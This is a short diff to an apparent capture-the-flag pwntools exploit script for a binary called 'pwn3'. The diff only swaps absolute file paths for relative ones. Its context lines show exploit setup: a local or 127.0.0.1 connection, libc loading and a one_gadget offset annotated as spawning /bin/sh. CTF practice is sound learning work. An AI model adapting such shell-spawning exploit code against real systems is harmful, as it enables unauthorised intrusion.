@@ -440,14 +440,14 @@ def get_file(exp_file, name):
 def main():
     debug = 1
     if debug:
-        exp_file = process("/home/who/Desktop/pwn3")
-        elf_file = ELF("/home/who/Desktop/pwn3")
+        exp_file = process("./pwn3")
+        elf_file = ELF("./pwn3")
         libc_file = ELF("/lib/i386-linux-gnu/libc.so.6")
         one_gadget_offset = 0x3ac69  # execve("/bin/sh", esp+0x34(Null), environ)
         # print(exp_file.libs())
     else:
         exp_file = remote("127.0.0.1", 10000)
-        elf_file = ELF("/home/who/Desktop/pwn3")
+        elf_file = ELF("./pwn3")
         libc_file = ELF("/lib/i386-linux-gnu/libc.so.6")
         one_gadget_offset = 0x3ac69
         # print(exp_file.libs())
@@ -516,13 +516,13 @@ def get_file(exp_file, name):
 def main():
     debug = 1
     if debug:
-        exp_file = process("/home/who/Desktop/pwn3")
-        elf_file = ELF("/home/who/Desktop/pwn3")
+        exp_file = process("./pwn3")
+        elf_file = ELF("./pwn3")
         libc_file = ELF("/lib/i386-linux-gnu/libc.so.6")
         # print(exp_file.libs())
     else:
         exp_file = remote("127.0.0.1", 10000)
-        elf_file = ELF("/home/who/Desktop/pwn3")
+        elf_file = ELF("./pwn3")
         libc_file = ELF("/lib/i386-linux-gnu/libc.so.6")
         # print(exp_file.libs())
 
